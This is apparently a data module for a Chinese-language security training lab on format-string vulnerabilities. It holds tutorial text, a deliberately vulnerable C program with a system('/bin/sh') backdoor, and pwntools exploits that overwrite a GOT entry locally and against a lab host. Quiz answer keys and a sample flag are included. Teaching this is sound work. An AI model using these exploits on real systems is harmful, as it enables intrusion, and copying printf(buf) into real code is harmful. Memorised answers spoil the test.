// 格式化字符串实验模拟数据（配合操作环境本地编写漏洞程序，最终在远程靶机 getshell）
export const FormatStringExperiment = {
  id: 18,
  name: '格式化字符串实验',
  introduction:
    '本实验带你深入理解并实践格式化字符串漏洞：从 printf 函数的变参机制出发，理解为什么 printf(buf) 会成为高危漏洞；学会利用 %x/%p 泄露栈上数据、用 %s 读取任意地址字符串、用 %n 完成任意地址写入；最终结合 GOT 表劫持或返回地址覆盖，编写 exp 拿到远程靶机 shell 并读取 flag，掌握这一经典且威力巨大的漏洞利用手法。',
  difficulty: 4,
  taskPoints: [
    {
      id: 1,
      name: '格式化字符串漏洞原理',
      description: '理解 printf 变参机制，掌握格式化字符串漏洞的成因与危害',
      score: 20,
      document: `## 格式化字符串漏洞原理

### 1. printf 的正常用法
**printf** 是 C 标准库的格式化输出函数，原型为：

~~~c
int printf(const char *format, ...);
~~~

注意第二个参数是 **...**，表示**可变参数**（变参）。调用时，调用者负责告诉 printf 需要格式化几个参数、各是什么类型——这个信息全部编码在 \`format\` 字符串里。

正常用法：
~~~c
printf("name=%s, age=%d\\n", name, age);
//              ↑           ↑
//        这些 %s %d 告诉 printf 从栈上对应位置读取参数
~~~

### 2. 漏洞成因：把用户输入当作 format
如果开发者图省事，把用户输入直接当作 format 字符串：
~~~c
char buf[100];
read(0, buf, 100);
printf(buf);    // ← 漏洞！用户可以自己写 %x %p %n 等格式符
~~~

此时 \`buf\` 的内容由攻击者完全控制。攻击者可以在输入里写 \`%x.%x.%x\`，printf 就会**老实地从栈上后续位置读取数据当参数打印出来**——即便开发者根本没传任何参数。

### 3. 常用格式符（漏洞利用视角）
- **%x / %p**：以十六进制打印栈上某个参数 → **泄露栈数据**（栈地址、堆地址、canary、代码地址等）。
- **%d**：以十进制打印 → 同样泄露数据。
- **%s**：把栈上某个参数当作**字符串指针**，打印该地址处的字符串 → **任意地址读取**（配合伪造指针）。
- **%n**：把**已打印字符数**写入栈上某个参数所指向的地址 → **任意地址写入**（威力最大）。
- **%N\$x**：直接指定读取第 N 个参数（如 \`%6$x\` 读第 6 个参数），避免堆叠大量 %x。

### 4. 为什么 %n 危害最大
%n 不打印数据，而是**写**：它把"到目前为止 printf 已经输出的字符数"写到指针所指地址。配合 \`%Nc\`（输出 N 个字符）可以控制写入的数值，再配合 \`%hn\`（写 2 字节）、\`%hhn\`（写 1 字节）即可实现**任意地址写入任意值**——足以劫持 GOT 表、返回地址、函数指针，实现控制流转移。

### 5. 漏洞危害小结
- 任意地址读：泄露源码、泄露 canary、泄露 libc 地址（绕过 ASLR）。
- 任意地址写：改写 GOT 表、改写 hook 函数（如 \`__malloc_hook\`）、改写返回地址。
- 最终效果：和栈溢出一样可以 getshell，但**不依赖缓冲区溢出**，更隐蔽。

### 6. 防御
- 永远用 \`printf("%s", buf)\` 而不是 \`printf(buf)\`。
- 编译期开 \`_FORTIFY_SOURCE\`（gcc -D_FORTIFY_SOURCE=2），它会在编译时检测常量 format 串的参数匹配，并在运行时阻止 %n 写入只读区。
- 现代工具链默认在很多场景禁用 %n。`,
      questions: [
        {
          id: 1,
          content: '格式化字符串漏洞的根本成因是？',
          score: 6,
          requiresTarget: false,
          type: 'multiple-choice',
          options: [
            'printf 函数本身设计不安全',
            '把用户可控的输入直接当作 printf 的 format 字符串',
            '栈溢出导致返回地址被覆盖',
            '使用了危险函数 system'
          ],
          answer: [1]
        },
        {
          id: 2,
          content: '在格式化字符串漏洞中，%n 的作用是？',
          score: 7,
          requiresTarget: false,
          type: 'single-choice',
          options: [
            '打印一个换行符',
            '打印栈上的下一个参数',
            '把已打印的字符数写入参数所指地址（任意地址写）',
            '读取一个字符串'
          ],
          answer: 2
        },
        {
          id: 3,
          content: '以下哪种写法可以避免格式化字符串漏洞？',
          score: 7,
          requiresTarget: false,
          type: 'multiple-choice',
          options: [
            'printf(buf);',
            'printf("%s", buf);',
            'sprintf(str, buf);',
            'fprintf(stdout, buf);'
          ],
          answer: [1]
        }
      ]
    },
    {
      id: 2,
      name: '编写漏洞程序与栈上任意地址泄露',
      description: '在操作环境编写含格式化字符串漏洞的程序，用 %p 泄露栈数据',
      score: 25,
      document: `## 编写漏洞程序与栈上任意地址泄露

### 1. 编写 fmt.c
在操作环境终端输入 **vim fmt.c**，按 **i** 进入编辑模式，写入以下带漏洞程序：

~~~c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void init()
{
    setvbuf(stdin, 0LL, 2, 0LL);
    setvbuf(stdout, 0LL, 2, 0LL);
    setvbuf(stderr, 0LL, 2, 0LL);
}

int main()
{
    init();
    char buf[100];
    puts("input something:");
    read(0, buf, 100);
    buf[99] = '\\0';
    printf(buf);          // ← 漏洞：用户输入直接当 format
    puts("");
    return 0;
}
~~~

要点：
- \`printf(buf)\` 把用户输入当 format，是经典格式化字符串漏洞。
- 没有任何栈溢出，但同样能造成任意地址读写。

### 2. 编译（关闭保护，便于教学）
~~~bash
gcc -o fmt fmt.c -fno-stack-protector -no-pie -Wl,-z,norelro
~~~

参数含义：
- **-no-pie**：程序加载到固定地址，GOT 表地址固定可写死。
- **-Wl,-z,norelro**：关闭 RELRO，使 GOT 表可写（否则 Full RELRO 下 GOT 只读，%n 写不进去）。
- **-fno-stack-protector**：关闭 Canary（虽然本实验不靠栈溢出，但方便调试时栈上能看到完整数据）。

### 3. 用 %p 泄露栈数据
运行 \`./fmt\`，输入：

~~~text
%p.%p.%p.%p.%p.%p.%p.%p
~~~

程序会把栈上后续 8 个"参数"打印出来，形如：

~~~text
0x7ffd12345678.0x100.0x7f1234567890.(nil).0x61.0x7f.....
~~~

这些值依次对应 printf 从栈上读取的"第 1、2、3... 个参数"。其中可能包含：
- **栈地址**（0x7ffd 开头）
- **libc 地址**（0x7f 开头）
- **canary**（看上去像随机的大数，末字节通常为 \\x00）
- **代码段地址**（0x400000 附近，用于绕过 PIE 后定位函数）

### 4. 用 %N$p 直接定位关键参数
不想堆叠很多 %p 时，可以用 \`%6$p\` 直接读第 6 个参数：

~~~text
%6$p
~~~

经验：在 64 位 glibc 下，**用户输入的 buf 通常位于 printf 的第 6 个参数位置**（因为前 5 个参数走寄存器 rdi/rsi/rdx/rcx/r8/r9，buf 落在栈上第 6 个位置起）。也就是说：\`%6$p\` 会打印 buf 自身的内容。

### 5. 验证"buf 自己读自己"
输入：
~~~text
AAAA%6$p
~~~
输出会是：
~~~text
AAAA0x4141414141
~~~
\`0x41414141\` 正是我们写的 4 个 \`A\`（'A' 的 ASCII 是 0x41）。

**这一步极其关键**：它证明我们可以通过 \`%N$p\` 精确定位 buf 在栈上的位置。后续我们就能在 buf 里**塞入目标地址**，再用 \`%N$s\` 或 \`%N$n\` 让 printf 把这个地址当指针用——从而实现任意地址读 / 写。`,
      questions: [
        {
          id: 1,
          content: '在 64 位 glibc 下，用户输入的 buf 通常位于 printf 的第几个参数位置？',
          score: 8,
          requiresTarget: false,
          type: 'single-choice',
          options: ['第 1 个', '第 3 个', '第 6 个', '第 100 个'],
          answer: 2
        },
        {
          id: 2,
          content: '为什么编译时要加 -Wl,-z,norelro？',
          score: 8,
          requiresTarget: false,
          type: 'multiple-choice',
          options: [
            '关闭栈保护 Canary',
            '关闭 RELRO，使 GOT 表可写，便于 %n 写入劫持',
            '关闭 ASLR',
            '开启静态链接'
          ],
          answer: [1]
        },
        {
          id: 3,
          content: '输入 AAAA%6$p 后看到 0x41414141，说明什么？',
          score: 9,
          requiresTarget: false,
          type: 'single-choice',
          options: [
            '程序崩溃了',
            '我们已通过 %6$p 精确定位到 buf 在栈上的位置，可后续利用',
            '程序有 SQL 注入',
            'canary 被泄露'
          ],
          answer: 1
        }
      ]
    },
    {
      id: 3,
      name: '任意地址写入：用 %n 改写 GOT 表',
      description: '构造 payload，用 %n 把目标地址写入指定值，劫持 GOT 表',
      score: 25,
      document: `## 任意地址写入：用 %n 改写 GOT 表

### 1. 利用思路
我们的目标是 **改写某个函数的 GOT 表项**，让它在被调用时跳到我们想要的地址（如 system 或后门函数）。

GOT 表：动态链接的函数（如 puts、printf）在第一次调用时由 ld 解析真实地址并填入 GOT 表，后续调用直接跳到 GOT 表里存的地址。如果 GOT 表可写（即 RELRO 未开 Full），我们用 %n 改写它，就等于劫持了该函数。

### 2. 选定劫持目标
- **被劫持函数**：选一个 printf 之后还会被调用的函数（如 puts），改写它的 GOT 表项。
- **目标地址**：可以是程序里的后门函数（教学用），也可以是 system+合适偏移（实战）。

用 pwndbg 查看 GOT 表：
~~~text
gdb fmt
pwndbg> got
~~~
会列出所有 GOT 项及其当前地址，例如 \`puts -> 0x401036\`，GOT 表里 \`puts@got\` 的地址形如 \`0x404018\`。

用 pwndbg 找后门函数地址（如果程序里有的话）：
~~~text
pwndbg> p backdoor
pwndbg> disassemble backdoor
~~~

### 3. 任意地址写的基本构造
%N$n 写入的是"已打印字符数"。我们要写入指定值 V，就需要让 printf 在执行 %N$n 前**正好打印了 V 个字符**。可以用 \`%Mc\`（输出 M 个字符，M = V - 已打印数）控制。

**单字节写入（%hhn）最实用**：一次只写 1 字节，分 3 次写 3 字节即可覆盖一个地址。这样数值小、可控、不会因为写入巨大数值导致构造过长 payload。

例如要把地址 \`0x401234\` 写入 \`0x404018\`：
- 把 0x404018、0x404019、0x40401a 三个地址放进 buf
- 用 %hhn 分别写入 0x34、0x12、0x40

### 4. payload 结构（教学示例：单次 %n 写入后门地址）
假设 buf 位于 printf 第 6 个参数位置，后门地址 \`0x4011b6\`，目标 GOT 地址 \`0x404018\`：

~~~text
payload = [0x404018 (8字节地址)] + "%Nc" + "%M$n"
~~~

其中：
- 前 8 字节是目标地址（占用了 buf 开头）
- \`%Nc\` 输出若干字符，让总输出数等于 0x4011b6（或低 2/4 字节）
- \`%M$n\` 把这个数写到第 M 个参数所指地址——M 由 buf 中地址的位置决定

由于地址 0x4011b6 = 4198838 太大，直接 %c 输出这么多字符不现实，所以实战通常用 **%hn 分两次写 2 字节**，或 **%hhn 分三次写 1 字节**。

### 5. pwntools 一键构造：fmtstr_payload
手算偏移繁琐易错，pwntools 提供了 **fmtstr_payload** 自动生成 payload：

~~~python
from pwn import *

elf = ELF('./fmt')
io = process('./fmt')

# 关键参数：
# offset：buf 在 printf 的第几个参数位置（前面用 AAAA%6$p 测出为 6）
# target：要写入的 GOT 地址
# value：要写入的目标地址（如后门函数地址）
payload = fmtstr_payload(6, {elf.got['puts']: elf.symbols['backdoor']})

io.sendlineafter(b'something:', payload)
io.interactive()
~~~

\`fmtstr_payload\` 会自动处理地址布局、%hhn 分字节写入、对齐等问题，是实战标配。

### 6. 触发劫持
payload 发送后，程序里下次调用 puts（或被劫持的函数）时，就会跳到我们写入的地址（如 backdoor），从而 getshell。

### 7. 没有 backdoor 怎么办
如果程序里没有后门函数，需要：
1. 先用 %p 泄露 libc 地址（绕过 ASLR）。
2. 计算 system、/bin/sh 在 libc 中的真实地址。
3. 用 fmtstr_payload 把 \`__malloc_hook\` 或某个 GOT 项改成 system，并构造参数为 /bin/sh。

这是实战 pwn 题的标准流程，本实验靶机会提供相对简单的版本（带后门或单次写入即可拿 flag）。`,
      questions: [
        {
          id: 1,
          content: '为什么改写 GOT 表可以劫持函数调用？',
          score: 8,
          requiresTarget: false,
          type: 'multiple-choice',
          options: [
            'GOT 表存了函数的真实地址，调用时直接跳过去',
            'GOT 表存了函数的源码',
            'GOT 表是栈上的缓冲区',
            'GOT 表存了用户的输入'
          ],
          answer: [0]
        },
        {
          id: 2,
          content: '为什么实战中通常用 %hhn 分多次写 1 字节，而不是用 %n 一次写 4 字节？',
          score: 9,
          requiresTarget: false,
          type: 'multiple-choice',
          options: [
            '%n 一次写入的数值过大，构造 %c 输出几百万字符不现实',
            '%n 不能写入数据',
            '%hhn 不需要 buf 在栈上',
            '一次写入会触发 Canary'
          ],
          answer: [0]
        },
        {
          id: 3,
          content: 'pwntools 中用于自动生成格式化字符串任意地址写 payload 的函数是？',
          score: 8,
          requiresTarget: false,
          type: 'single-choice',
          options: ['p32()', 'fmtstr_payload()', 'cyclic()', 'asm()'],
          answer: 1
        }
      ]
    },
    {
      id: 4,
      name: '本地实战：编写 exp 完成任意地址写',
      description: '用 pwntools 编写完整 exp，本地 getshell 并读取 flag',
      score: 25,
      document: `## 本地实战：编写 exp 完成任意地址写

### 1. 完整漏洞程序 fmt.c（带后门）
为了让本地实战可以闭环，我们在程序里加一个后门函数 \`backdoor\`：

~~~c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void backdoor()
{
    system("/bin/sh");
}

void init()
{
    setvbuf(stdin, 0LL, 2, 0LL);
    setvbuf(stdout, 0LL, 2, 0LL);
    setvbuf(stderr, 0LL, 2, 0LL);
}

int main()
{
    init();
    char buf[100];
    puts("input something:");
    read(0, buf, 100);
    buf[99] = '\\0';
    printf(buf);          // ← 格式化字符串漏洞
    puts("");
    return 0;
}
~~~

编译：
~~~bash
gcc -o fmt fmt.c -fno-stack-protector -no-pie -Wl,-z,norelro
~~~

### 2. 用 pwndbg 找关键地址
~~~bash
gdb fmt
pwndbg> p backdoor        # 得到 backdoor 地址，例如 0x4011b6
pwndbg> got               # 得到 puts 的 GOT 地址，例如 0x404018
~~~

### 3. 测出 buf 在栈上的参数偏移
~~~bash
pwndbg> r
input something:
AAAA%6$p
~~~
若输出 \`AAAA0x4141414141\`，说明 offset = 6（如果不同，就改用你测出的值）。

### 4. 编写 exp.py
~~~python
from pwn import *

context.arch = 'amd64'
elf = ELF('./fmt')
io = process('./fmt')

# 偏移：buf 在 printf 的第 6 个参数位置
# 目标：把 puts@got 改写成 backdoor 的地址
payload = fmtstr_payload(6, {elf.got['puts']: elf.symbols['backdoor']})

io.sendlineafter(b'something:', payload)
# printf 执行完，puts@got 已被改成 backdoor
# main 里下一个 puts("") 会触发跳转到 backdoor，拿到 shell
io.interactive()
~~~

### 5. 运行
~~~bash
python3 exp.py
~~~
成功后会进入 \`$\` 提示符：
~~~text
$ ls
exp.py  flag  fmt  fmt.c
$ cat flag
flag{fmt_string_pwned}
~~~

### 6. payload 结构解读
\`fmtstr_payload\` 生成的 payload 大致是：
~~~text
[目标地址若干字节(8字节对齐)] + "%Nc%K$hhn" + "%Mc%L$hhn" + ...
~~~
其中每段 \`%Nc%K$hhn\` 控制"已打印字符数"的低字节写入到 buf 里第 K 个参数（即某个目标地址字节）。\`fmtstr_payload\` 自动算好偏移，我们只需提供 \`{目标地址: 目标值}\` 字典。

### 7. 调试技巧
如果 exp 没成功：
- 在 gdb 里下断点 \`b *main+XXX\`（printf 之后），单步观察 \`puts@got\` 是否被改写：
  ~~~text
  pwndbg> x/gx 0x404018
  ~~~
- 检查 offset 是否正确：换不同输入长度再测一次 \`AAAA%6$p\`。
- 检查对齐：fmtstr_payload 默认按 8 字节对齐，如果 buf 起始未对齐，需要手动 padding。
- 若 payload 超过 read 允许长度，可改用更短的写入（如只写低 2/3 字节）。

完成本节后，你已掌握"任意地址写 + GOT 劫持"完整链路。`,
      questions: [
        {
          id: 1,
          content: 'exp.py 中 fmtstr_payload(6, {...}) 的 6 含义是？',
          score: 8,
          requiresTarget: false,
          type: 'single-choice',
          options: [
            '写入 6 个字节',
            'buf 在 printf 第 6 个参数位置的偏移',
            '写入 6 次',
            'GOT 表偏移'
          ],
          answer: 1
        },
        {
          id: 2,
          content: 'payload 发送后，程序里下一个 puts("") 为什么会触发 getshell？',
          score: 9,
          requiresTarget: false,
          type: 'multiple-choice',
          options: [
            'puts 跳转到 GOT 表里存的地址，而该地址已被我们改写成 backdoor',
            'puts 是系统调用',
            '栈溢出了',
            'Canary 失效'
          ],
          answer: [0]
        },
        {
          id: 3,
          content: '请粘贴你本地 getshell 后 cat flag 的输出（或描述你完成本实验的过程与收获）。',
          score: 8,
          requiresTarget: false,
          type: 'open-ended-with-answer'
        }
      ]
    },
    {
      id: 5,
      name: '远程靶机实战',
      description: '连接真实远程靶机，利用格式化字符串漏洞 getshell 并提交 flag',
      score: 40,
      document: `## 远程靶机实战

前面你已在操作环境本地掌握了格式化字符串漏洞的任意地址写。现在挑战一个**真实远程靶机**——和传统 pwn 题一样：你没有源码、没有 shell，只能通过漏洞利用拿到 flag。

### 1. 连接靶机
本实验靶机默认已就绪并接入操作环境桌面网络，无需手动启动。在**操作环境桌面终端**里连接：
~~~bash
nc format-string-lab-web-1 70
~~~

### 2. 信息收集
靶机程序可能不给你源码，需要自己分析：
- 用 \`file\`、\`checksec\` 查看程序架构与保护（重点关注 RELRO 是否为 No/Partial，Full RELRO 下 GOT 不可写）。
- 用 pwndbg / objdump 反汇编，找到 \`printf\` 调用点，确认是否 \`printf(buf)\` 形式。
- 用 \`AAAA%6\$p\`（或 %7\$p、%8\$p 逐一尝试）测出 buf 的参数偏移。

### 3. 利用思路（按靶机保护情况选择）
- **No RELRO / Partial RELRO + 程序里有后门**：直接 fmtstr_payload 改 GOT 到后门地址（和本地一样）。
- **有后门但 RELRO Full**：改写栈上的返回地址（需要先泄露栈地址）。
- **没有后门**：
  1. 用 \`%p\` 泄露栈上的 libc 地址，计算 libc 基址。
  2. 找到 system、\`/bin/sh\`、\`__malloc_hook\` 在 libc 中的偏移。
  3. 用 fmtstr_payload 改写 \`__malloc_hook\` 为 one_gadget，或改写某个 GOT 项为 system 并构造参数。

### 4. 编写 exp（pwntools）
~~~python
from pwn import *

context.arch = 'amd64'
io = remote('format-string-lab-web-1', 70)

# 1. 泄露 + 计算（视靶机情况）
# 2. 构造 payload
payload = fmtstr_payload(offset, {target_addr: target_value})
io.sendlineafter(b'something:', payload)
io.interactive()
~~~
getshell 后：
~~~bash
ls
cat flag
~~~

### 5. 提交 flag
把拿到的 flag 填到下方并提交即可校验（靶机默认已就绪，无需手动启动）。

### 6. 常见坑
- **buf 偏移测错**：64 位下偏移常在 6~8 之间，务必用 \`AAAA%N\$p\` 验证看到 \`0x41414141\` 才算数。
- **payload 被截断**：read 长度有限制时，优先用 %hhn 分字节写，且把所有目标地址集中在 payload 头部一次写完。
- **地址含 \\x00**：printf 用 \`%s\` 会被 \\x00 截断，但 fmtstr_payload 用 \`%N\$hhn\` 不依赖 %s，仍可处理含 \\x00 的地址（只要 read 能读到）。
- **对齐问题**：payload 总长度需保证后续 %N\$hhn 偏移正确，fmtstr_payload 会自动 pad 对齐，手写时要注意。
- **栈变化**：多次调用 printf 时栈布局可能变化，尽量一次 payload 完成所有写入。`,
      questions: [
        {
          id: 1,
          content: '提交你从远程靶机 getshell 后 cat flag 得到的 flag（格式 flag{...}）',
          score: 40,
          requiresTarget: true,
          type: 'open-ended-without-answer'
        }
      ]
    }
  ]
}
